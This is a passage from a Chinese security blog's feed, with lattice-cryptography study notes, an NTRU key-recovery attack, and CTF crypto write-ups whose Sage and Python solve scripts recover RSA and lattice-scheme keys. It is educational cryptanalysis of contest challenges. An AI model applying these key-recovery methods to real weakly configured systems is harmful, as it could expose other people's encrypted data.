class="title">randommessage</span>():</span></span><br><span class="line">    result = list(randrange(<span class="number">3</span>) - <span class="number">1</span> <span class="keyword">for</span> j <span class="keyword">in</span> range(n))</span><br><span class="line">    <span class="keyword">return</span> Zx(result)</span><br></pre></td></tr></table></figure><h4 id="Encrypt"><a href="#Encrypt" class="headerlink" title="Encrypt"></a>Encrypt</h4><p>NTRU密码系统的加密</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span>(<span class="params">message,publickey</span>):</span></span><br><span class="line">    r = randomdpoly()</span><br><span class="line">    <span class="keyword">return</span> balancedmod(convolution(publickey,r) + message,q)</span><br></pre></td></tr></table></figure><h4 id="Decrypt"><a href="#Decrypt" class="headerlink" title="Decrypt"></a>Decrypt</h4><p>NTRU密码系统的解密</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span>(<span class="params">ciphertext,secretkey</span>):</span></span><br><span class="line">    f, f3 = secretkey</span><br><span class="line">    a = balancedmod(convolution(ciphertext,f),q)</span><br><span class="line">    <span class="keyword">return</span> balancedmod(convolution(a,f3),<span class="number">3</span>)</span><br></pre></td></tr></table></figure><p><img src="/img/Lattice_learning/5.png" alt="Coppersmith"></p><p>加密解密的原理比较简单，这里就不再赘述，但是要注意如果参数大于了正常的解密范围，极有可能引起解密失败，但可以通过标准化 $q,n,d$ 来解决， $q$ 的选取越小越好，因为多项式的系数可以为 <code>&#123;-1,0,1&#125;</code>这类</p><h4 id="Attack"><a href="#Attack" class="headerlink" title="Attack"></a>Attack</h4><p>这里的攻击方式显然并不是恢复 $publickey$ 中的 $f(x)$ ，<del>毕竟这也太靠脸了</del></p><p>由于NTRU的解密合法性，我们发现如果我们能找到一组 $f(x)$ 与 $g(x)$ 也满足 $key$ 的关系，那么我们就能拿这组多项式来充当新的 $key$</p><p>我们的矩阵构造如下<br>$$<br>B^{NTRU}<br>=<br>{\begin{bmatrix}<br>\pmb{1}&amp;\pmb{h(x)} \\<br>\pmb{0}&amp;\pmb{q}<br>\end{bmatrix}}<br>=<br>\begin{bmatrix}<br>\begin{array}{lllll|lllll}<br>1&amp;0&amp;0&amp;\cdots&amp;0&amp;h_0&amp;h_1&amp;h_2&amp;\cdots&amp;h_{n-1} \\<br>0&amp;1&amp;0&amp;\cdots&amp;0&amp;h_{n-1}&amp;h_0&amp;h_1&amp;\cdots&amp;h_{n-2} \\<br>0&amp;0&amp;1&amp;\cdots&amp;0&amp;h_{n-2}&amp;h_{n-1}&amp;h_0&amp;\cdots&amp;h_{n-3} \\<br>\vdots&amp;\vdots&amp;\vdots&amp;\ddots&amp;\vdots&amp;\vdots&amp;\vdots&amp;\vdots&amp;\ddots&amp;\vdots \\<br>0&amp;0&amp;0&amp;\cdots&amp;1&amp;h_1&amp;h_2&amp;h_3&amp;\cdots&amp;h_0 \\<br>\hline<br>0&amp;0&amp;0&amp;\cdots&amp;0&amp;q&amp;0&amp;\cdots&amp;0 \\<br>0&amp;0&amp;0&amp;\cdots&amp;0&amp;0&amp;q&amp;0&amp;\cdots&amp;0 \\<br>0&amp;0&amp;0&amp;\cdots&amp;0&amp;0&amp;0&amp;q&amp;\cdots&amp;0 \\<br>\vdots&amp;\vdots&amp;\vdots&amp;\ddots&amp;\vdots&amp;\vdots&amp;\vdots&amp;\vdots&amp;\ddots&amp;\vdots \\<br>0&amp;0&amp;0&amp;\cdots&amp;0&amp;0&amp;0&amp;0&amp;\cdots&amp;q \\<br>\end{array}<br>\end{bmatrix}<br>$$<br>当然左上角也可以选任意的正整数 $\lambda$ ， 同余方程里 $f(x)$ 乘个系数 $\lambda$ 罢了，对 $B^{NTRU}$ 格基规约后得到的第一个向量就可以作为新的 $f’(x)$ 和 $g’(x)$ 了</p><p>据说可以添加一个大整数 $\theta$ ，这样方便规约，如下<br>$$<br>B^{NTRU}_{\theta}<br>=<br>{\begin{bmatrix}<br>\pmb{1}&amp;\pmb{\theta h(x)} \\<br>\pmb{0}&amp;\pmb{q\theta}<br>\end{bmatrix}}<br>$$<br>不过现在遇到的题基本上都是给的多项式计算后的数，直接用多项式的好像很少（？，但原理层面上是差不多的，只不过关系好推一点，代码实现起来也简单点吧</p><h3 id="LWE-learning-with-error"><a href="#LWE-learning-with-error" class="headerlink" title="LWE (learning with error)"></a>LWE (learning with error)</h3><p>Waiting for undate……</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Lattice-learning-2&quot;&gt;&lt;a href=&quot;#Lattice-learning-2&quot; class=&quot;headerlink&quot; title=&quot;Lattice learning 2&quot;&gt;&lt;/a&gt;Lattice learning 2&lt;/h1&gt;&lt;blockquo</summary>
      
    
    
    
    <category term="Crypto" scheme="http://example.com/categories/Crypto/"/>
    
    
    <category term="Crypto" scheme="http://example.com/tags/Crypto/"/>
    
  </entry>
  
  <entry>
    <title>Lattice learning 1</title>
    <link href="http://example.com/2021/03/17/Lattice_learning1/"/>
    <id>http://example.com/2021/03/17/Lattice_learning1/</id>
    <published>2021-03-17T11:55:40.000Z</published>
    <updated>2021-03-19T03:11:00.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Lattice-learning-1"><a href="#Lattice-learning-1" class="headerlink" title="Lattice learning 1"></a>Lattice learning 1</h1><h2 id="Preface"><a href="#Preface" class="headerlink" title="Preface"></a>Preface</h2><p>花了一下午的时间学完了线代<br>数学家们上辈子一定是天使吧，才能发明出这么美妙的东西<br>线性代数 相见恨晚</p><h2 id="Chapter-1-The-world-of-the-Lattice"><a href="#Chapter-1-The-world-of-the-Lattice" class="headerlink" title="Chapter 1 The world of the Lattice"></a>Chapter 1 The world of the Lattice</h2><p>向量真是个神奇的东西，因为世界上的一切都可以用向量来表示。那么如果我们要去表示一个线性空间 $V$ ，我们就需要至少两个非线性相关的向量作为基底，比方说 $\vec{i}$ 和 $\vec{j}$，因此任意的一个向量都可以用基底的线性组合来表示出来，比如 $\vec{x}=a\cdot\vec{i}+b\cdot\vec{j}$ 。而能被 $\vec{i}$ 和 $\vec{j}$ 表示出来的所有向量的集合就称为这个线性空间 $V$ 。但是这里的’$a$’和’$b$’可以是任意的数字，那么如果我们假定这里的’$a$’和’$b$’都是整数（$a,b\in\mathbb{Z}$），这时我们就会得到一个整数格（Integer Lattice）。</p><p>我们首先使得所有的向量起点都位于原点，此时，所有的向量都与它们各自的终点一一对应，也就是说，我们可以使用向量的终点来代替该向量。那么此时我们的整数格 $V$ 就会变成一群离散开来并且有序排布的点集。当然，这些点的排列方式并不唯一，可以通过一些简单的线性变换来得到一个新的格空间。</p><p>举个栗子吧，比方说我们现在有 $\vec{b_1},\vec{b_2},\cdots,\vec{b_n}$ 作为基，那么格空间里所有的向量都可以被看作是一个矩阵 $A$：<br>$$<br>A=\sum^n_{i=1}(b_i\cdot \mathbb{Z})<br>$$<br>当然你也可以把这些基看成一个矩阵 $B$：<br>$$<br>A=\sum^n_{i=1}(b_i\cdot\mathbb{Z})=B\cdot x(x\in\mathbb{Z}^n)<br>$$<br>所以说了这么多，格到底是什么东西？我们可以把它理解成一堆向量的集合，但是向量是很有意思的玩意。</p><h2 id="Chapher-2-Notions-in-Lattice"><a href="#Chapher-2-Notions-in-Lattice" class="headerlink" title="Chapher 2 Notions in Lattice"></a>Chapher 2 Notions in Lattice</h2><h3 id="行列式（Determinant）"><a href="#行列式（Determinant）" class="headerlink" title="行列式（Determinant）"></a>行列式（Determinant）</h3><p>一个矩阵的行列式可以看作是一种特殊的变换：它描述了由所有基向量组成的四边形或者多面体在这种线性变换中其面积或者体积的变化。</p><h3 id="最短距离（Shortest-distance）"><a href="#最短距离（Shortest-distance）" class="headerlink" title="最短距离（Shortest distance）"></a>最短距离（Shortest distance）</h3><p>比如一个由矩阵 $B$ 形成的格空间中，我们使用 $\lambda$ 来表示这个矩阵点集中的的最短距离，那么显然通过更换原点/基的方法来把这个问题变成一个 $SVP$：<br>$$<br>\lambda_1=min||x-y||\ \ \ (x,y\in B,x\not=y) \\<br>=min||x||\ \ \ (x\in B,x\not=\vec{0})~~~~~~<br>$$<br>另外，我们用 $\lambda_2,\lambda_3,\cdots,\lambda_i,\cdots,\lambda_n$ 来表示第 $i$ 短的距离，那么显然以下结论成立：<br>$$<br>\lambda_1\leq\lambda_2\leq\lambda_3\leq\cdots\leq\lambda_n<br>$$</p><h2 id="Chapher-3-Problems-in-Lattice"><a href="#Chapher-3-Problems-in-Lattice" class="headerlink" title="Chapher 3 Problems in Lattice"></a>Chapher 3 Problems in Lattice</h2><h3 id="最短向量-SVP-Shortest-Vector-Problem"><a href="#最短向量-SVP-Shortest-Vector-Problem" class="headerlink" title="最短向量 SVP (Shortest Vector Problem)"></a>最短向量 SVP (Shortest Vector Problem)</h3><p>我们来考虑一个由矩阵 $B$ 构成的格空间 $L$ ，在其中去找这样的一个向量 $\vec{x}$ 满足：<br>$$<br>||B\vec{x}||= \lambda_1\ \ \ (x\in \mathbb{Z}^k)<br>$$<br><img src="/img/Lattice_learning/1.png" alt="SVP"></p><p>好像看起来不难？但是当我们拿到一组较差的基时，此时的 $SVP$ 就很难求了，但是也有一种 $SVP$ 的简化版本 $SVP_\gamma$ 。在 $SVP_\gamma$ 中，我们只需要找到这样的向量 $\vec{x}$ 即可：<br>$$<br>||B\vec{x}||\leq \gamma\lambda_1\ \ \ (x\in \mathbb{Z}^k)<br>$$</p><h3 id="最近向量-CVP-Closest-Vector-Problem"><a href="#最近向量-CVP-Closest-Vector-Problem" class="headerlink" title="最近向量 CVP (Closest Vector Problem)"></a>最近向量 CVP (Closest Vector Problem)</h3><p>还是考虑一个由矩阵 $B$ 构成的格空间 $L$ ，给出一个点 $t$ ，在其中去找里点 $t$ 最近的一个向量 $\vec{x}$ ，也就是说：<br>$$<br>||B\vec{x}-\vec{t}||\leq\mu<br>$$</p><p><img src="/img/Lattice_learning/2.png" alt="CVP"></p><p>$CVP$ 也有它的简化版本 $CVP_\gamma$ ，其定义与 $SVP_\gamma$ 类似，即满足：<br>$$<br>||B\vec{x}-\vec{t}||\leq \gamma\mu\ \ \ (x\in \mathbb{Z}^k)<br>$$</p><p>$SVP$ 和 $CVP$ 都被证明是 np-hard 的问题 <del>说白了就是难的离谱</del></p><h2 id="Chapher-4-Geometric-structure-in-Lattice"><a href="#Chapher-4-Geometric-structure-in-Lattice" class="headerlink" title="Chapher 4 Geometric structure in Lattice"></a>Chapher 4 Geometric structure in Lattice</h2><h3 id="尝试解决CVP"><a href="#尝试解决CVP" class="headerlink" title="尝试解决CVP"></a>尝试解决CVP</h3><p>CVP真的压根无法下手吗？显然不是。比如在笛卡尔坐标系里，只需要简单的上下取整就能找到此时的 $CVP$ ， $SVP$ 此时显然也是很简单的问题。那么我们只要能够将格 $\Lambda$ 变成一个几乎是正交基的格 $L$ ，那么我们就能很容易的解决 $SVP$ 和 $CVP$ 。我们通常称这个过程为’Lattice Basis Reduction’，比如’Gram-Schmidt’就是其中之一的方法，但是此时我们通过简单上下取整的操作不一定得到的就是正确的答案，也只有当 $||\vec{t}-\vec{v}||\leq min\frac{||\vec{b_i}||}{2}$ 时我们得到的才是正确的结果，原因如下图：</p><p><img src="/img/Lattice_learning/3.png" alt="Gram-Schmidt"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Lattice-learning-1&quot;&gt;&lt;a href=&quot;#Lattice-learning-1&quot; class=&quot;headerlink&quot; title=&quot;Lattice learning 1&quot;&gt;&lt;/a&gt;Lattice learning 1&lt;/h1&gt;&lt;h2 id=&quot;P</summary>
      
    
    
    
    <category term="Crypto" scheme="http://example.com/categories/Crypto/"/>
    
    
    <category term="Crypto" scheme="http://example.com/tags/Crypto/"/>
    
  </entry>
  
  <entry>
    <title>Thanks for reward</title>
    <link href="http://example.com/2021/03/17/Thanks_for_reward/"/>
    <id>http://example.com/2021/03/17/Thanks_for_reward/</id>
    <published>2021-03-17T11:55:40.000Z</published>
    <updated>2021-03-17T14:50:56.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="打赏鸣谢"><a href="#打赏鸣谢" class="headerlink" title="打赏鸣谢"></a>打赏鸣谢</h1><p>会有的吧会有的吧会有的吧会有的吧会有的吧（哭</p><table><thead><tr><th align="left">ID</th><th align="left">Time</th><th align="left">Money</th></tr></thead><tbody><tr><td align="left">幸福一生</td><td align="left">2021-03-06 00:07:55</td><td align="left">￥1</td></tr></tbody></table><p><img src="/img/wechat.png" alt="img"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;打赏鸣谢&quot;&gt;&lt;a href=&quot;#打赏鸣谢&quot; class=&quot;headerlink&quot; title=&quot;打赏鸣谢&quot;&gt;&lt;/a&gt;打赏鸣谢&lt;/h1&gt;&lt;p&gt;会有的吧会有的吧会有的吧会有的吧会有的吧（哭&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th align=&quot;lef</summary>
      
    
    
    
    <category term="Text" scheme="http://example.com/categories/Text/"/>
    
    
    <category term="Thanks" scheme="http://example.com/tags/Thanks/"/>
    
  </entry>
  
  <entry>
    <title>Writeup for V&amp;NCTF&#39;s crypto</title>
    <link href="http://example.com/2021/03/14/Writeup_for_V&amp;NCTF2021&#39;s_crypto/"/>
    <id>http://example.com/2021/03/14/Writeup_for_V&amp;NCTF2021&#39;s_crypto/</id>
    <published>2021-03-14T14:17:49.000Z</published>
    <updated>2021-04-05T13:55:12.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Writeup-for-V-amp-NCTF-39-s-crypto"><a href="#Writeup-for-V-amp-NCTF-39-s-crypto" class="headerlink" title="Writeup for V&amp;NCTF&#39;s crypto"></a>Writeup for V&amp;NCTF&#39;s crypto</h1><h2 id="whitegive"><a href="#whitegive" class="headerlink" title="whitegive"></a>whitegive</h2><p>密码方向签到题，先分解n，详细推导过程如下：</p><p>$$<br>e\cdot d \equiv 1\pmod{lcm(p,p-1,q-1)}=k\cdot \frac{p\times(p-1)\times(q-1)}{gcd}+1<br>$$</p><p>$$<br>m^{e\cdot d}=m\pmod{((p-1)\times p)}\ 且\ m^{e\cdot d}=m\pmod{(q-1)}<br>$$</p><p>$$<br>m^{ed}\equiv m\pmod{((p-1)\times(q-1)\times p)}<br>$$</p><p>$$<br>e\cdot d=k\times p\times(p-1)\times(q-1)+1<br>$$</p><p>$$<br>(e\cdot d)^e=\sum^{e}_{i=0}C^i_e\cdot (k\times p\times (p-1)\times(q-1))^i\times 1^{e-i}=K\times p +1<br>$$</p><p>所以<code>n</code>很容易被分解，从而算得前一步的<code>e</code>，此时发现<code>d</code>较小（满足如下关系）</p><p>$$<br>\frac{1}{3}N^{\frac{1}{4}}\leq d\leq N^{0.292}<br>$$</p><p>我们这里使用维纳攻击，但是因为<code>d</code>相对于连分数还是比较大的，需要理解原理稍微优化一下，得到一个<code>URL</code>，下载后得到另一个的脚本，最后一步较为简单，先在<code>sage</code>里用<code>small_roots</code>算出来<code>padding</code>，然后<code>related_message_attack</code>即可解决</p><h2 id="Strange-function-amp-Strange-function-revenge"><a href="#Strange-function-amp-Strange-function-revenge" class="headerlink" title="Strange_function &amp; Strange_function_revenge"></a>Strange_function &amp; Strange_function_revenge</h2><p>交互题，在<code>data</code>数组已知的情况下需要连续正确提交五次<code>token</code></p><p>服务器提供计算<code>f(x)</code>满足<br>$$<br>f(x)=\sum^{len(token)}_{i=1}\frac{ord(token_i)}{x-data_i}<br>$$</p><p>显然<code>ord(token[i])</code>不超过130，而<code>data</code>却是2^32左右的数字，我们简单计算下<br>$$<br>130\div 2^{32}\times16\times5\approx 0.000002421438694000244140625<br>$$<br>$$<br>130\div 2^{17}\times 8 \times5\approx 0.0396728515625<br>$$<br>所以当我们的<code>x</code>逼近其中的一个<code>data_i</code>时对<code>f(x)</code>的影响微乎其微，基本可以忽略，所以可以通过这一点来得到<code>token[i]</code>，思路如下：</p><p>我们发现：</p><p>$$<br>f(data_1+1)=\sum^{len(token)}_{i=1}\frac{ord(token_i)}{(data_1+1)-data_i}=<br>$$</p><p>$$<br>ord(token_1)+\sum^{len(token)}_{i=2}\frac{ord(token_i)}{x-data_i}\approx<br>$$</p><p>$$<br>ord(token_1)+\sum^{len(token)}_{i=2}\frac{1}{\infty}= ord(token_1)<br>$$</p><p>当然分子部分显然离无穷还是比较远的，那么我们要么想办法扩大<code>data</code>之间的距离，要么想办法抵消或者减小掉后面部分的影响，因为<code>data</code>和<code>token</code>均不可控，这里我们选择如下的方法来逼近<code>ord(token[i])</code><br>$$<br>k\times token(i)=\bigg(\frac{f(data_i+1)+f(data_i-1)}{2}\bigg)+\bigg(f(data_i+2)+f(data_i-2)\bigg)+\cdots<br>$$<br>交互时间大概几分钟</p><blockquote><p>其实+1-1之后已经就消掉了，后面的只是为了更加确保</p></blockquote><h2 id="Factor"><a href="#Factor" class="headerlink" title="Factor"></a>Factor</h2><p>给了两组特别的RSA公钥，特点是共用一个<code>d</code>，但<br>$$<br>d=inv(e,(p+1)*(q+1))<br>$$<br>具体推导如下：</p><p>对于每一组公钥，我们有：<br>$$<br>e_i\cdot d=k_i(N_i+s_i)+1<br>$$<br>我们也可以给他们进行重新排序，使之满足：<br>$$<br>N_1&lt;N_2&lt;2N_1<br>$$<br>这里我们的推导过程如下：<br>$$<br>令M=\lfloor N_2^{\frac{1}{2}}\rfloor\ 有：<br>$$<br>$$<br>dM ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ =dM ~~~~~~~~~~~<br>$$<br>$$<br>e_1d-N_1k_1 ~~~~~~~~~~~~~~~ =1+k_1s_1 ~~<br>$$<br>$$<br>e_2d ~~~~~~~~~~~~~~~ -N_2k_2=1+k_2s_2 ~~<br>$$</p><p>这样的三个方程组我们可以写成这样的向量矩阵方程<br>$$<br>XB=V<br>$$<br>$$<br>X={\begin{bmatrix}<br>dM &amp; e1 &amp; e2<br>\end{bmatrix}}<br>$$<br>$$<br>B={\begin{bmatrix}<br>M &amp; e1 &amp; e2 \\<br> &amp; -N_1 &amp;  \\<br> &amp; &amp; -N_2<br>\end{bmatrix}}<br>$$<br>$$<br>V={\begin{bmatrix}<br>dM &amp; 1+k_1s_1 &amp; 1+k_2s_2<br>\end{bmatrix}}<br>$$<br>LLL格基规约后即可算出 <code>d</code>和每一个<code>not_phi</code>，接着就可以轻松分解<code>N</code>，RSA正常解密即可</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Writeup-for-V-amp-NCTF-39-s-crypto&quot;&gt;&lt;a href=&quot;#Writeup-for-V-amp-NCTF-39-s-crypto&quot; class=&quot;headerlink&quot; title=&quot;Writeup for V&amp;amp;NCTF&amp;#</summary>
      
    
    
    
    <category term="Writeup" scheme="http://example.com/categories/Writeup/"/>
    
    
    <category term="Crypto" scheme="http://example.com/tags/Crypto/"/>
    
    <category term="Writeup" scheme="http://example.com/tags/Writeup/"/>
    
  </entry>
  
  <entry>
    <title>Write up for AntCTF X D^3CTF&#39;s crypto</title>
    <link href="http://example.com/2021/03/08/Wp_for_AntCTF_X_D^3CTF&#39;s_crypto/"/>
    <id>http://example.com/2021/03/08/Wp_for_AntCTF_X_D^3CTF&#39;s_crypto/</id>
    <published>2021-03-08T14:53:03.000Z</published>
    <updated>2021-03-14T14:30:36.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Wp-for-AntCTF-X-D-3CTF-39-s-crypto"><a href="#Wp-for-AntCTF-X-D-3CTF-39-s-crypto" class="headerlink" title="Wp for AntCTF X D^3CTF&#39;s crypto"></a>Wp for AntCTF X D^3CTF&#39;s crypto</h1><p>我的格子和椭圆曲线实在是太烂了，奈何这次比赛基本都是（</p><p>这次只贡献了1k分，我对不起V&amp;N的师傅们呜呜呜</p><a id="more"></a><h2 id="babyLattice"><a href="#babyLattice" class="headerlink" title="babyLattice"></a>babyLattice</h2><p>联合第二题，发现此题应该要分解n，观察秘钥生成代码，发现如下关系：</p><p>$$<br>a_1 = k \cdot n + a_{11} \cdot q \cdot inv(q,p) + a_{21} \cdot p \cdot inv(p,q)<br>$$<br>$$<br>a_2 = k \cdot n + a_{12} \cdot q \cdot inv(q,p) + a_{22} \cdot p \cdot inv(p,q)<br>$$</p><p>所以<br>$$<br>a_1 = a_{11} \pmod{p} = a_{21} \pmod{q}<br>$$<br>$$<br>a_2 = a_{12} \pmod{p} = a_{22} \pmod{q}<br>$$</p><p>所以易知<br>$$<br>b =\frac{a_{11}}{a_{12}}\pmod{p}=\frac{a_{21}}{a_{22}}\pmod{q}<br>$$</p><p>即</p><p>$$<br>b\cdot a_{12} - a_{11} = 0 \pmod{p}<br>$$<br>$$<br>b\cdot a_{22} - a_{21} = 0 \pmod{q}<br>$$</p><p>所以</p><p>$$<br>(b\cdot a_{12}-a_{11})(b\cdot a_{22}-a_{21})=0 \pmod{n}<br>$$</p><p>即</p><p>$$<br>b^2\cdot a_{12}\cdot a_{22} - b\cdot (a_{12}\cdot a_{21}+a_{11}\cdot a_{22}) + (a_{11}\cdot a_{21}) = 0 \pmod{n}<br>$$</p><p>我们选择构造格子<br>$$<br>{\begin{bmatrix}<br>1 &amp; 0 &amp; b^2 \\<br>0 &amp; 1 &amp; b \\<br>0 &amp; 0 &amp; n<br>\end{bmatrix}}<br>$$</p><p>LLL格基规约后再分解就能得到<code>a_12</code>、<code>a_22</code>、<code>a_12</code>和<code>a_22</code>，就可以恢复出<code>A</code>，关于中间的顺序，首先 $gcd(n,b\cdot a_{12}-a_{11})=p，gcd(n,b\cdot a_{22} - a_{21})=q$ ，然后反过头来用<code>b</code>检验，即可得到<code>A</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">n&#x3D;69804507328197961654128697510310109608046244030437362639637009184945533884294737870524186521509776189989451383438084507903660182212556466321058025788319193059894825570785105388123718921480698851551024108844782091117408753782599961943040695892323702361910107399806150571836786642746371968124465646209366215361</span><br><span class="line">b&#x3D;65473938578022920848984901484624361251869406821863616908777213906525858437236185832214198627510663632409869363143982594947164139220013904654196960829350642413348771918422220404777505345053202159200378935309593802916875681436442734667249049535670986673774487031873808527230023029662915806344014429627710399196</span><br><span class="line">m &#x3D; [[1,0,b**2],</span><br><span class="line">[0,1,b],</span><br><span class="line">[0,0,n]]</span><br><span class="line">M &#x3D; Matrix(ZZ,m)</span><br><span class="line">print(M.LLL()</span><br></pre></td></tr></table></figure><p>私钥拿到之后跑一遍decrypt函数就行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">from hashlib import sha256</span><br><span class="line"></span><br><span class="line">def decrypt(c, sk):</span><br><span class="line">a2 &#x3D; crt([sk.A[0,1], sk.A[1,1]], [sk.p, sk.q])</span><br><span class="line">s1 &#x3D; a2 * c % sk.p</span><br><span class="line">s2 &#x3D; a2 * c % sk.q</span><br><span class="line">m, r &#x3D; sk.A.solve_right(vector([s1, s2]))</span><br><span class="line">return m</span><br><span class="line">SecretKey &#x3D; namedtuple(&#39;SecretKey&#39;, [&#39;p&#39;, &#39;q&#39;, &#39;A&#39;])</span><br><span class="line">n &#x3D; 698045073281979616541286975103101096080462440304373626396370091849455338842947378705241865215097761899894513834380845079036601822125564663210580257883191930598948255707851053881237189214806988515510241088447820911174087537825999619430406958923237023619101073xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx</span><br><span class="line">b &#x3D; 654739385780229208489849014846243612518694068218636169087772139065258584372361858322141986275106636324098693631439825949471641392200139046541969608293506424133487719184222204047775053450532021592003789353095938029168756814364427346672490495356709866737744870xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx</span><br><span class="line">c &#x3D; 646663549384661940527205918107837690305665046534094651211733313626546652315738092349139857587250480713115715497774817768266247287420861746098971608971187502431927910215773481811303025721859117507974577939210694737300392259917557553409275067663952621259499393xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx</span><br><span class="line">a21 &#x3D; 2078066511675xxxxxxxxxxxxxxxxx</span><br><span class="line">a11 &#x3D; 1017199123798xxxxxxxxxxxxxxxxxx</span><br><span class="line">a12 &#x3D; 1018979931854xxxxxxxxxxxxxxxxxx</span><br><span class="line">a22 &#x3D; 1151291153120xxxxxxxxxxxxxxxxxx</span><br><span class="line">assert a21*a12+a11*a22 &#x3D;&#x3D; 1382843159437215516163973075066558157591473xxxxxxxxxxxxxxxxxx</span><br><span class="line">p &#x3D; gcd(n,(b*a12-a11)%n)</span><br><span class="line">q &#x3D; gcd(n,(b*a22-a21)%n)</span><br><span class="line">print(p,q)</span><br><span class="line">assert p*q &#x3D;&#x3D; n</span><br><span class="line">a1 &#x3D; crt([a11, a21], [p, q])</span><br><span class="line">a2 &#x3D; crt([a12, a22], [p, q])</span><br><span class="line">assert b &#x3D;&#x3D; a1 * inverse_mod(a2, n) % n</span><br><span class="line">A &#x3D; Matrix(ZZ, [[a11, a12], [a21, a22]])</span><br><span class="line">SK &#x3D; SecretKey(p, q, A)</span><br><span class="line">m &#x3D; decrypt(c, SK)</span><br><span class="line">flag &#x3D; &#39;d3ctf&#123;%s&#125;&#39; % sha256(int(m).to_bytes(50, &#39;big&#39;)).hexdigest()</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><h2 id="simpleGroup"><a href="#simpleGroup" class="headerlink" title="simpleGroup"></a>simpleGroup</h2><p>发现给的n和babyLattice是一样的，直接把p和q抄过来，然后发现 $e\mid\varphi(n)$</p><p>每次加密有 $C = y^m \cdot r^e % n$ ，则 $C^{(phi/e)} = {(y^m)}^{(phi/e)} * r^phi = {(y^m)}^{(phi/e)} = {(y^{(phi/e)})}^m\pmod{n}$ </p><p>即 $C^{(phi/e)} = {(y^{(phi/e)})}^m\pmod{n}$ ，因为 $m = M \pmod{e}$ ，显然 $m&lt;e$ ，bsgs爆破得到<code>mlist</code>，返回去即可得到<code>flag</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">BSGS</span>(<span class="params">G,H,P</span>):</span></span><br><span class="line">    L1,L2 = [],[]</span><br><span class="line">    N = iroot(<span class="number">1928983487</span>,<span class="number">2</span>)[<span class="number">0</span>]+<span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(N+<span class="number">1</span>):</span><br><span class="line">        L1.append(pow(G,i,P))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(N+<span class="number">1</span>):</span><br><span class="line">        tmp=H * inverse(pow(G,i*N,P),P) % P</span><br><span class="line">        L2.append(tmp)</span><br><span class="line">        <span class="keyword">if</span> tmp <span class="keyword">in</span> L1:</span><br><span class="line">            a=L1.index(tmp)</span><br><span class="line">            b=i</span><br><span class="line">            <span class="keyword">return</span> int(b*N+a)</span><br><span class="line"></span><br><span class="line">n = <span class="number">698045073281979616541286975103101096080462440304373626396370091849455338842947378705241865215097761899894513834380845079036601822125564663210580257883191930598948255707851053881237189214806988515510241088447820911174087537825999619430406958923237023619101073</span>xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx</span><br><span class="line">y = <span class="number">120648015457233473229369911867385603110490612355410315808075494222588141707717382622649304416707083082596945889632243725304983056485785205520380297738493422061250742129127888238341527857566977572098044750319744459636919415157569012683762673605426564496697153</span>xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx</span><br><span class="line">e = <span class="number">1928983487</span></span><br><span class="line">p = <span 